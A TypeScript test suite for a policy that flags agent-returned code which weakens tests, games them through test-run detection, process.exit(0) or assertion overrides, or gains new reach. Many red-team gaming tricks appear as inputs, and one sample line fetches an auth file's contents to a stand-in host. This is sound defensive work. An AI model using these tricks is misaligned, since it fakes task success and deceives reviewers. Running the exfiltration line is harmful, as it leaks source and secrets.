/**
 * The hand-off policy on a test the slice was handed: an assertion removed
 * or rewritten, or a test skipped, is held for the maintainer.
 */

import assert from "node:assert/strict";
import { test } from "node:test";
import { gainedReach, handoffPolicy, integrityOf, reachOf, weakenedTest } from "../src/policy.js";

const TEST = [
  'import assert from "node:assert/strict";',
  'import { test } from "node:test";',
  'import { price } from "../src/price.js";',
  'test("prices", () => {',
  "  assert.equal(price(1), 4);",
  "  assert.equal(",
  "    price(2),",
  "    8,",
  "  );",
  "});",
  "",
].join("\n");

test("a test bent to pass is held for the maintainer; one only added to passes", () => {
  const path = "pkg/test/price.test.ts";
  assert.equal(weakenedTest(path, TEST, TEST), null);
  // An assertion added, the others kept: a stronger test.
  assert.equal(weakenedTest(path, TEST, TEST.replace("});", "  assert.equal(price(0), 0);\n});")), null);
  // Formatting alone changes nothing.
  assert.equal(weakenedTest(path, TEST, TEST.replace("  assert.equal(\n    price(2),\n    8,\n  );", "  assert.equal(price(2), 8);")), null);
  assert.match(weakenedTest(path, TEST, TEST.replace("price(1), 4", "price(1), 3")) ?? "", /rewrites 1 assertion/);
  assert.match(weakenedTest(path, TEST, TEST.replace("    8,", "    6,")) ?? "", /rewrites 1 assertion/);
  assert.match(weakenedTest(path, TEST, TEST.replace("  assert.equal(price(1), 4);\n", "")) ?? "", /removes or rewrites 1 assertion/);
  assert.match(weakenedTest(path, TEST, TEST.replace('test("prices"', 'test.skip("prices"')) ?? "", /skips 1 more test/);
  assert.match(weakenedTest(path, TEST, TEST.replace('test("prices", ', 'test("prices", { skip: true }, ')) ?? "", /skips 1 more test/);
  // Vitest's expect, imported or global.
  const vitest = 'describe("p", () => { it("x", () => { expect(price(1)).toBe(4); }); });\n';
  assert.match(weakenedTest(path, vitest, vitest.replace("toBe(4)", "toBe(3)")) ?? "", /rewrites 1 assertion/);
});

test("an assertion that can no longer run counts as removed", () => {
  const path = "src/price.test.ts";
  const gutted = (from: string, to: string) => weakenedTest(path, TEST, TEST.replace(from, to)) ?? "";
  // Every assertion's text is still there, but none of it runs.
  assert.match(gutted('test("prices", () => {\n', 'test("prices", () => {\n  return;\n'), /removes or rewrites 2 assertions/);
  assert.match(gutted("  assert.equal(price(1), 4);\n", '  throw new Error("skip");\n  assert.equal(price(1), 4);\n'), /removes or rewrites 2 assertions/);
  assert.match(gutted("  assert.equal(price(1), 4);", "  if (false) assert.equal(price(1), 4);"), /removes or rewrites 1 assertion/);
  assert.match(gutted("  assert.equal(price(1), 4);", "  false && assert.equal(price(1), 4);"), /removes or rewrites 1 assertion/);
  // A branch that may not run holds its assertion only sometimes: held,
  // as a rewrite. One that always runs, and an early return after the
  // assertions, pass.
  assert.match(gutted("  assert.equal(price(1), 4);", "  if (process.env.X) assert.equal(price(1), 4);"), /removes or rewrites 1 assertion/);
  assert.match(gutted("  assert.equal(price(1), 4);", "  for (const x of []) assert.equal(price(1), 4);"), /removes or rewrites 1 assertion/);
  assert.match(gutted("  assert.equal(price(1), 4);", "  const later = () => assert.equal(price(1), 4);"), /removes or rewrites 1 assertion/);
  assert.equal(gutted("  assert.equal(price(1), 4);", "  if (true) assert.equal(price(1), 4);"), "");
  assert.equal(gutted("    8,\n  );\n", "    8,\n  );\n  return;\n"), "");
  // A failure swallowed by a catch that does not throw again.
  assert.match(gutted("  assert.equal(price(1), 4);", "  try { assert.equal(price(1), 4); } catch {}"), /removes or rewrites 1 assertion/);
  assert.equal(
    gutted("  assert.equal(price(1), 4);", "  try { assert.equal(price(1), 4); } catch (error) { log(error); throw error; }"),
    "",
  );
});

test("a script's reach beyond its own computation is read from its syntax", () => {
  const reach = (text: string) => reachOf("pkg/test/x.test.ts", text);
  // A test's ordinary imports reach nothing.
  assert.deepEqual(reach(TEST), []);
  assert.deepEqual(reach('import { setTimeout } from "node:timers/promises";\nimport { createHash } from "node:crypto";\n'), []);
  // The disk, the process, the network.
  assert.deepEqual(reach('import { readFileSync } from "node:fs";\n'), ["node:fs"]);
  assert.deepEqual(reach('import fs from "fs/promises";\n'), ["node:fs"]);
  assert.deepEqual(reach('const cp = require("child_process");\n'), ["node:child_process"]);
  assert.deepEqual(reach('const net = await import("node:net");\n'), ["node:net"]);
  assert.deepEqual(reach('import http = require("http");\n'), ["node:http"]);
  assert.deepEqual(reach('export { request } from "node:https";\n'), ["node:https"]);
  assert.deepEqual(reach('await fetch("https://example.test/" + secret);\n'), ["fetch"]);
  assert.deepEqual(reach("await globalThis.fetch(url);\n"), ["fetch"]);
  assert.deepEqual(reach('await globalThis["fetch"](url);\n'), ["fetch"]);
  assert.deepEqual(reach("const f = { fetch };\n"), ["fetch"]);
  assert.deepEqual(reach("new WebSocket(url);\n"), ["WebSocket"]);
  // The environment, and code run from text.
  assert.deepEqual(reach("const key = process.env.API_KEY;\n"), ["process.env"]);
  assert.deepEqual(reach('const key = process["env"].API_KEY;\n'), ["process.env"]);
  assert.deepEqual(reach("const key = import.meta.env.VITE_KEY;\n"), ["import.meta.env"]);
  assert.deepEqual(reach('eval("1");\nnew Function("return 1");\n'), ["Function", "eval"]);
  // Named by a computed value: could be any of the above.
  assert.deepEqual(reach("await import(name);\n"), ["a module named by a computed value"]);
  assert.deepEqual(reach('const m = require("node:" + "fs");\n'), ["a module named by a computed value"]);
  assert.deepEqual(reach('globalThis["fe" + "tch"](url);\n'), ["a global named by a computed value"]);
  assert.deepEqual(reach("process[key];\n"), ["a process member named by a computed value"]);
  // A service SDK.
  assert.deepEqual(reach('import { S3Client } from "@aws-sdk/client-s3";\n'), ["@aws-sdk/client-s3"]);
  // Members, types and type-only imports are not reads.
  assert.deepEqual(reach("client.fetch(1);\nconst o = { fetch: 1 };\nlet f: Function;\ntype F = typeof fetch;\n"), []);
  assert.deepEqual(reach('import type { Stats } from "node:fs";\nprocess.exitCode = 1;\n'), []);
});

test("a returned script that gains a reach is held; one that keeps its reach passes", () => {
  const path = "pkg/test/exfil.test.ts";
  const exfil = 'import { readFileSync } from "node:fs";\nawait fetch("https://x.test/?d=" + readFileSync("../../apps/api/src/auth.ts", "utf8"));\n';
  assert.deepEqual(gainedReach(path, null, exfil), ["fetch", "node:fs"]);
  // A module that read the disk before may keep doing so.
  const reader = 'import { readFileSync } from "node:fs";\nexport const load = (p: string) => readFileSync(p, "utf8");\n';
  assert.deepEqual(gainedReach("pkg/src/load.ts", reader, reader.replace('"utf8"', '"latin1"')), []);
  assert.deepEqual(gainedReach("pkg/src/load.ts", reader, `${reader}export const key = process.env.KEY;\n`), ["process.env"]);
  // Declarations and data run nothing.
  assert.deepEqual(gainedReach("pkg/src/x.d.ts", null, 'import "node:fs";\n'), []);
  assert.deepEqual(gainedReach("pkg/data.json", null, '{"fetch": 1}'), []);

  const judge = handoffPolicy({ reach: true });
  assert.match(judge(path, "added", { before: null, after: exfil }) ?? "", /reaches what it did not before \(fetch, node:fs\)/);
  assert.equal(judge(path, "added", { before: null, after: TEST }), null);
  // The maintainer, having read it, lets it through by path.
  assert.equal(handoffPolicy({ reach: true, allow: ["pkg/test/**"] })(path, "added", { before: null, after: exfil }), null);
  // Off unless asked: `gate` judges an agent in the repository, which may use the disk.
  assert.equal(handoffPolicy({})(path, "added", { before: null, after: exfil }), null);
});

test("a test's data, setup and mocks are held as its assertions are; additions pass", () => {
  const path = "pkg/test/price.test.ts";
  const DATA = [
    'import assert from "node:assert/strict";',
    'import { describe, it } from "node:test";',
    'import { price } from "../src/price.js";',
    "",
    "const input = 1;",
    "const expected = 4;",
    "",
    'describe("price", () => {',
    "  const tax = 0;",
    '  it("prices", () => {',
    "    const result = price(input) + tax;",
    "    assert.equal(result, expected);",
    "  });",
    "});",
    "",
  ].join("\n");
  const judge = (after: string) => weakenedTest(path, DATA, after) ?? "";
  // The value compared with, the data passed in, a setup line: rewritten.
  assert.match(judge(DATA.replace("const expected = 4;", "const expected = 3;")), /rewrites or removes 1 other statement/);
  assert.match(judge(DATA.replace("const input = 1;", "const input = 0;")), /rewrites or removes 1 other statement/);
  assert.match(judge(DATA.replace("    const result = price(input) + tax;", "    const result = 4;")), /rewrites or removes 1 other statement/);
  // A test added inside the describe, a name added to an import, a new
  // statement before the assertion: the old statements stay as they were.
  assert.equal(
    judge(DATA.replace("  });\n});", '  });\n  it("prices zero", () => {\n    assert.equal(price(0), 0);\n  });\n});')),
    "",
  );
  assert.equal(judge(DATA.replace("import { price }", "import { price, total }")), "");
  assert.equal(judge(DATA.replace("    assert.equal(result, expected);", "    const total = result * 2;\n    assert.equal(result, expected);")), "");
  // A mock of the code's own module stands in for it; a package's does not.
  assert.match(
    judge(`${DATA}vi.mock("../src/price.js", () => ({ price: () => 4 }));\n`),
    /mocks 1 more of the code's own modules \(\.\.\/src\/price\.js\)/,
  );
  assert.match(judge(`${DATA}mock.module("../src/price.js", { namedExports: { price: () => 4 } });\n`), /mocks 1 more/);
  // A package's mock added at the top changes what every test in the file
  // sees: held as a statement that runs before them.
  assert.match(judge(`${DATA}vi.mock("stripe");\n`), /adds 1 statement that run before/);
  // A fake's method added passes; one rewritten is held.
  const FAKE = "export class FakeDb {\n  rows = [1];\n  count() { return this.rows.length; }\n}\n";
  assert.equal(weakenedTest("pkg/test/fakes.ts", FAKE, FAKE.replace("  count()", "  first() { return this.rows[0]; }\n  count()")), null);
  assert.match(weakenedTest("pkg/test/fakes.ts", FAKE, FAKE.replace("this.rows.length", "1")) ?? "", /rewrites or removes 1 other statement/);
});

test("a script that could pass a test without the code passing it is read from its syntax", () => {
  const inTest = (text: string) => integrityOf("pkg/test/x.test.ts", text);
  const inSource = (text: string) => integrityOf("pkg/src/x.ts", text);
  // Ending the run before the tests do, or swallowing their failures.
  assert.deepEqual(inTest("process.exit(0);\n"), ["process.exit"]);
  assert.deepEqual(inTest("process.exitCode = 0;\n"), ["process.exitCode"]);
  assert.deepEqual(inTest("process.kill(process.pid);\n"), ["process.kill"]);
  assert.deepEqual(inTest('process.on("uncaughtException", () => {});\n'), ['process.on("uncaughtException")']);
  assert.deepEqual(inTest("server.kill();\nprocess.kill(child.pid);\n"), []);
  // Rewriting the assertions or the runner, anywhere.
  assert.deepEqual(inTest('import assert from "node:assert/strict";\nassert.equal = () => {};\n'), [
    "rewrites the test runner or the assertion library",
  ]);
  assert.deepEqual(inSource('import * as a from "node:assert";\nObject.assign(a, { ok() {} });\n'), [
    "rewrites the test runner or the assertion library",
  ]);
  // The code under test telling a test run from a real one.
  assert.deepEqual(inSource('export const f = () => (typeof describe === "function" ? 4 : 0);\n'), ["typeof describe"]);
  assert.deepEqual(inSource("if (import.meta.vitest) {}\n"), ["import.meta.vitest"]);
  assert.deepEqual(inSource("const t = process.env.VITEST;\n"), ["process.env.VITEST"]);
  assert.deepEqual(inSource('if (process.env.NODE_ENV === "test") {}\n'), ['NODE_ENV === "test"']);
  assert.deepEqual(inSource('const t = process.argv.join(" ").includes("test");\n'), ["process.argv matched against a test runner"]);
  assert.deepEqual(inSource("const g = globalThis.it;\n"), ["globalThis.it"]);
  // ... or rewriting a built-in it calls; a test may fake one for itself.
  assert.deepEqual(inSource("Array.prototype.includes = () => true;\n"), ["rewrites Array.prototype.includes"]);
  assert.deepEqual(inTest("Date.now = () => 0;\n"), []);
  // Ordinary code is none of these.
  assert.deepEqual(inSource('if (process.env.NODE_ENV === "production") {}\nconst args = process.argv.slice(2);\nexport function main() { process.exit(1); }\n'), []);
  assert.deepEqual(inTest('import { test } from "node:test";\ntest("x", () => {});\n'), []);
});

test("code built from text, a module from a URL or a name hidden behind a value counts as reach", () => {
  const reach = (text: string) => reachOf("pkg/src/x.ts", text);
  assert.deepEqual(reach('const run = ({} as any).constructor.constructor("return 1");\n'), ["a constructor reached through .constructor"]);
  assert.deepEqual(reach('const r = require;\nr("fs");\n'), ["require taken as a value"]);
  assert.deepEqual(reach('const g = globalThis;\ng["fetch"]("x");\n'), ["the global object taken as a value"]);
  assert.deepEqual(reach('await import("data:text/javascript,export default 1");\n'), ["a module loaded from a URL"]);
  assert.deepEqual(reach("await WebAssembly.instantiate(bytes);\n"), ["WebAssembly"]);
  // Naming a module to resolve it, and a global's member by name, are not.
  assert.deepEqual(reach('const p = require.resolve("x");\nconst v = globalThis.structuredClone;\n'), []);
});

test("the policy holds a test's helper or fixture edited or deleted, and what could pass a test without the code", () => {
  const judge = handoffPolicy({ integrity: true });
  assert.match(judge("pkg/test/fixtures/order.json", "changed", { before: '{"total": 4}', after: '{"total": 3}' }) ?? "", /changes a test fixture/);
  assert.match(judge("pkg/test/helpers.ts", "deleted") ?? "", /deletes a test's helper or fixture/);
  assert.match(
    judge("pkg/src/price.ts", "changed", { before: "export const price = (n: number) => n * 4;\n", after: 'export const price = (n: number) => (typeof it === "function" ? 4 : n * 4);\n' }) ?? "",
    /could pass a test without the code passing it \(typeof it\)/,
  );
  assert.match(judge("pkg/test/price.test.ts", "added", { before: null, after: "process.exit(0);\n" }) ?? "", /process\.exit/);
  // A script that had it may keep it; off unless asked.
  assert.equal(judge("pkg/test/run.test.ts", "changed", { before: "process.exitCode = 1;\n", after: "process.exitCode = 1;\nconst x = 1;\n" }), null);
  assert.equal(handoffPolicy({})("pkg/test/price.test.ts", "added", { before: null, after: "process.exit(0);\n" }), null);
});

test("round two: the ways around a test's verdict a reviewer found are held", () => {
  const N = [
    'import assert from "node:assert/strict";',
    'import { test } from "node:test";',
    'import { total } from "./checkout";',
    "",
    'test("total adds prices", () => {',
    "  const cart = { items: [{ price: 1 }, { price: 2 }] };",
    "  assert.equal(total(cart), 3);",
    "});",
    "",
  ].join("\n");
  const path = "apps/shop/src/checkout.test.ts";
  const held = (after: string) => weakenedTest(path, N, after) ?? "";
  // Skips the counters did not see.
  assert.match(held(N.replace("  const cart", "  t.todo();\n  const cart").replace('test("total adds prices", () => {', 'test("total adds prices", (t) => {')), /skips 1 more test/);
  assert.match(held(N.replace('test("total adds prices", () => {', 'test("total adds prices", { "skip": true }, () => {')), /skips 1 more test/);
  assert.match(held(`${N}const opts = { todo: true };\n`.replace('test("total adds prices", () => {', 'test("total adds prices", opts, () => {')), /skips 1 more test/);
  // An empty shell left behind, the body moved where it never runs.
  assert.match(held(N.replace('test("total adds prices", () => {', 'test("total adds prices", () => {});\ntest.skip("moved", () => {')), /removes or rewrites 1 assertion|skips/);
  // Early exits and wrappers that never run the assertion, or swallow it.
  assert.match(held(N.replace("  const cart", "  if (true) return;\n  const cart")), /removes or rewrites 1 assertion/);
  assert.match(held(N.replace("  assert.equal(total(cart), 3);", "  try { assert.equal(total(cart), 3); } finally { return; }")), /removes or rewrites 1 assertion/);
  assert.match(held(N.replace("  assert.equal(total(cart), 3);", "  try { assert.equal(total(cart), 3); } catch (e) { if (false) throw e; }")), /removes or rewrites 1 assertion/);
  assert.match(held(N.replace("  assert.equal(total(cart), 3);", "  switch (0) { case 0: break; default: assert.equal(total(cart), 3); }")), /removes or rewrites 1 assertion/);
  // What a kept assertion reads, changed by an added statement.
  assert.match(held(N.replace("  assert.equal", "  cart.items = [{ price: 3 }];\n  assert.equal")), /adds 1 statement/);
  assert.match(held(`${N}function total() {\n  return 3;\n}\n`), /adds 1 statement/);
  assert.match(held(N.replace("  assert.equal(total(cart), 3);", "  {\n    const cart = { items: [{ price: 3 }] };\n    assert.equal(total(cart), 3);\n  }")), /adds 1 statement/);
  assert.match(held(N.replace('test("total', 'beforeEach(() => {});\ntest("total')), /adds 1 statement/);
  // The code's own module, replaced without vi.mock.
  assert.match(held(N.replace('import { total } from "./checkout";', 'import * as checkout from "./checkout";\nimport { total } from "./checkout";').replace("  assert.equal", '  vi.spyOn(checkout, "total").mockReturnValue(3);\n  assert.equal')), /mocks 1 more of the code's own modules/);
  assert.match(held(`${N}vi.mock("@/checkout", () => ({ total: () => 3 }));\n`), /mocks 1 more/);
  // A string's own whitespace is not layout.
  const S = 'test("f", () => {\n  assert.equal(format(3), "$ 3.00");\n});\n';
  assert.match(weakenedTest(path, S, S.replace("$ 3.00", "$3.00")) ?? "", /rewrites 1 assertion/);
});

test("round two: the edits a contractor makes for real still pass", () => {
  const V = [
    'import { describe, expect, it, vi } from "vitest";',
    'import { total } from "./checkout";',
    "",
    'describe("total", () => {',
    "  const cases = [[1, 1]];",
    "  const fake = { id: 1 };",
    '  it("adds prices", () => {',
    "    expect(total(cases, fake)).toBe(3);",
    "  });",
    "});",
    "",
  ].join("\n");
  const path = "apps/shop/src/checkout.test.ts";
  const passes = (after: string) => assert.equal(weakenedTest(path, V, after), null, after);
  // A new test, in a file that imports describe and it from its runner.
  passes(V.replace("  });\n});", '  });\n  it("adds none", () => {\n    vi.useFakeTimers();\n    expect(total([], fake)).toBe(0);\n  });\n});'));
  // Formatting: quotes, semicolons, a reflow, a comment.
  passes(V.replaceAll('"', "'"));
  passes(V.replaceAll(";\n", "\n"));
  passes(V.replace("expect(total(cases, fake)).toBe(3);", "expect(\n      total(cases, fake), // two lines\n    ).toBe(3);"));
  // A table row, a field on fake data, wrapping in a describe.
  passes(V.replace("[[1, 1]]", "[[1, 1], [2, 2]]"));
  passes(V.replace("{ id: 1 }", "{ id: 1, name: \"x\" }"));
  passes(V.replace('describe("total", () => {', 'describe("checkout", () => {\ndescribe("total", () => {').replace(/\}\);\n$/, "});\n});\n"));
  // An import of the runner's names, a helper with a name of its own.
  passes(V.replace('import { describe, expect, it, vi } from "vitest";', 'import { beforeEach, describe, expect, it, vi } from "vitest";'));
  passes(`${V}export function cartOf(items: number[]) {\n  return { items };\n}\n`);
});

test("round two: reach and integrity a reviewer found", () => {
  const reach = (text: string) => reachOf("apps/shop/src/x.ts", text);
  assert.deepEqual(reach("const p = process;\np.getBuiltinModule(\"node:fs\");\n"), ["process taken as a value"]);
  assert.deepEqual(reach("const { env } = process;\n"), ["process taken as a value"]);
  assert.deepEqual(reach("const F = (() => {}).constructor;\nF(\"return 1\")();\n"), ["a constructor reached through .constructor"]);
  assert.deepEqual(reach("module.require(\"node:child_process\");\n"), ["the module loader (module.require)"]);
  assert.deepEqual(reach("const all = process.report.getReport();\n"), ["process.report"]);
  assert.deepEqual(reach('import env from "../../../.env?raw";\n'), ["a file loaded raw or as native code"]);
  assert.deepEqual(reach('import ts from "typescript";\nts.sys.readFile("x");\n'), ["typescript's sys (the disk and the environment)"]);
  assert.deepEqual(reach("const w = window;\n"), ["the global object taken as a value"]);
  assert.deepEqual(reach('import { run } from "node:test";\nrun({});\n'), ["a test run of its own (node:test run)"]);
  // A package the slice does not have, and a module outside its packages.
  assert.deepEqual(reachOf("apps/shop/src/x.ts", 'import WS from "ws";\nimport { keys } from "../../../services/billing/src/keys";\n', {
    knownPackages: new Set(["stripe"]),
    packages: new Set(["apps/shop"]),
    packageOf: (file) => file.split("/").slice(0, 2).join("/"),
  }), ["a module outside the slice's packages", "a package the slice does not have (ws)"]);
  // What is fine: a constructor's name, this.constructor, a spy on process, typeof.
  assert.deepEqual(reach("const n = x.constructor.name;\nclass A { clone() { return new (this.constructor as any)(); } }\nif (typeof process !== \"undefined\") {}\n"), []);
  const integrity = (file: string, text: string) => integrityOf(file, text);
  assert.deepEqual(integrity("apps/shop/src/checkout.test.ts", "const p = process;\np.exit(0);\n"), ["process.exit"]);
  assert.deepEqual(integrity("apps/shop/src/checkout.test.ts", "Object.is = () => true;\n"), ["rewrites Object.is"]);
  assert.deepEqual(integrity("apps/shop/src/checkout.test.ts", 'expect.extend({ toBe: () => ({ pass: true, message: () => "" }) });\n'), [
    "rewrites the test runner or the assertion library",
  ]);
  assert.deepEqual(integrity("apps/shop/src/checkout.test.ts", 'import assert from "node:assert";\nconst a = assert;\na.equal = () => {};\n'), [
    "rewrites the test runner or the assertion library",
  ]);
  assert.deepEqual(integrity("apps/shop/src/checkout.ts", 'Object.defineProperty(Object, "is", { value: () => true });\n'), ["rewrites Object"]);
  assert.deepEqual(integrity("apps/shop/src/checkout.ts", "queueMicrotask(() => process.exit(0));\n"), ["process.exit"]);
  assert.deepEqual(integrity("apps/shop/src/checkout.ts", "try { if (it) {} } catch {}\n"), ["it read as a global"]);
  // What is fine: a failing exit, a CLI's own argv, a test's fake clock, a signal's exit.
  assert.deepEqual(integrity("apps/shop/src/cli.ts", 'if (process.argv.includes("--with-tests")) process.exit(1);\nif (process.argv[2] === "test") run();\n'), []);
  assert.deepEqual(integrity("apps/shop/src/checkout.test.ts", "Date.now = () => 0;\n"), []);
  assert.deepEqual(integrity("apps/shop/test/server.ts", 'process.on("SIGTERM", () => process.exit(0));\n'), []);
  assert.deepEqual(integrity("apps/shop/src/errors.ts", "Error.stackTraceLimit = 50;\n"), []);
});

test("round three: a red-team of a returned folder", () => {
  const integrity = (file: string, text: string) => integrityOf(file, text);
  const reach = (text: string) => reachOf("apps/shop/src/x.ts", text);
  // An exit in a function of the code under test: a test that calls it ends
  // its file there, and node:test reports the file as passing. A CLI's own
  // exit is held too, as a question; a failing code and a signal's are not.
  assert.deepEqual(integrity("apps/shop/src/step.ts", "export function bail(x: number) { if (x < 0) process.exit(0); return x; }\n"), ["process.exit"]);
  assert.deepEqual(integrity("apps/shop/src/cli.ts", "export async function main() { process.exit(0); }\n"), ["process.exit"]);
  assert.deepEqual(integrity("apps/shop/src/cli.ts", "export function done(code: number) { process.exitCode = code; }\n"), ["process.exitCode"]);
  assert.deepEqual(integrity("apps/shop/src/cli.ts", "export function fail() { process.exit(1); }\n"), []);
  // The test file's own name, read from argv.
  assert.deepEqual(integrity("apps/shop/src/step.ts", 'export const isTest = () => String(process.argv[1]).endsWith("test.js");\n'), ["process.argv matched against a test runner"]);
  assert.deepEqual(integrity("apps/shop/src/step.ts", 'export const t = () => process.argv[1]?.endsWith("/spec.mjs");\n'), ["process.argv matched against a test runner"]);
  // import.meta.env through a cast, a computed key, a destructuring or an alias.
  assert.deepEqual(reach("export const e = () => (import.meta as any).env;\n"), ["import.meta.env"]);
  assert.deepEqual(reach('export const e = () => import.meta["env"];\n'), ["import.meta.env"]);
  assert.deepEqual(reach("const { env } = import.meta;\n"), ["import.meta.env"]);
  assert.deepEqual(reach("const m = import.meta;\nexport const e = () => m.env;\n"), ["import.meta taken as a value"]);
  assert.deepEqual(reach("export const e = (k: string) => (import.meta as any)[k];\n"), ["import.meta named by a computed value"]);
  // What is fine: the members that read no environment.
  assert.deepEqual(
    reach('const u = import.meta.url;\nconst d = import.meta.dirname;\nconst g = import.meta.glob("./*.ts");\nconst { url } = import.meta;\nimport.meta.hot?.accept();\n'),
    [],
  );
});

test("round two: paths a reviewer found", () => {
  const judge = handoffPolicy({ checks: true, integrity: true });
  assert.match(judge("apps/shop/vitest.config.ts", "added", { before: null, after: "export default {};\n" }) ?? "", /adds what a check holds code to/);
  assert.match(judge("apps/shop/vitest.setup.ts", "changed", { before: "", after: "beforeEach((c) => c.skip());\n" }) ?? "", /changes what a check holds code to/);
  assert.equal(judge("packages/new/tsconfig.json", "added", { before: null, after: "{}" }), null);
  assert.match(judge("apps/shop/project.json", "changed", { before: "{}", after: "{\"x\":1}" }) ?? "", /a protected path/);
  assert.match(judge("apps/shop/src/__snapshots__/checkout.test.ts.snap", "changed", { before: "a", after: "b" }) ?? "", /changes a test fixture/);
  assert.match(judge("apps/shop/src/__snapshots__/checkout.test.ts.snap", "deleted") ?? "", /deletes a test's helper or fixture/);
  assert.match(judge("apps/shop/test/fixtures/receipt.png", "changed") ?? "", /changes a test fixture/);
  assert.match(judge("apps/shop/src/Cart.vue", "added", { before: null, after: "<template/>" }) ?? "", /a language the policy does not read/);
  assert.match(judge("apps/shop/__mocks__/decimal.js.ts", "added", { before: null, after: "export default 1;\n" }) ?? "", /adds a module mock/);
  // A test's helper by name, or by what imports it.
  const helper = "export const make = () => ({ total: 3 });\n";
  assert.match(judge("apps/shop/src/test-helpers.ts", "changed", { before: helper, after: helper.replace("3", "4") }) ?? "", /rewrites or removes 1 other statement of a test's helper/);
  assert.match(
    handoffPolicy({ testSupport: (file) => file === "apps/shop/src/cart-data.ts" })("apps/shop/src/cart-data.ts", "changed", { before: helper, after: helper.replace("3", "4") }) ?? "",
    /a test's helper/,
  );
  // A test's @ts-expect-error tests the types.
  assert.equal(judge("apps/shop/src/checkout.test.ts", "added", { before: null, after: "// @ts-expect-error\ntotal(1);\n" }), null);
});

test("an import of an installed package's files by path is new reach", async () => {
  const { reachOf } = await import("../src/policy.js");
  const labels = reachOf("apps/shop/src/zz.test.ts", 'import "./node_modules/x.js";\nimport y from "../node_modules/y/index.js";\n', {});
  assert.ok(labels.includes("a package's files by path (node_modules)"), JSON.stringify(labels));
});
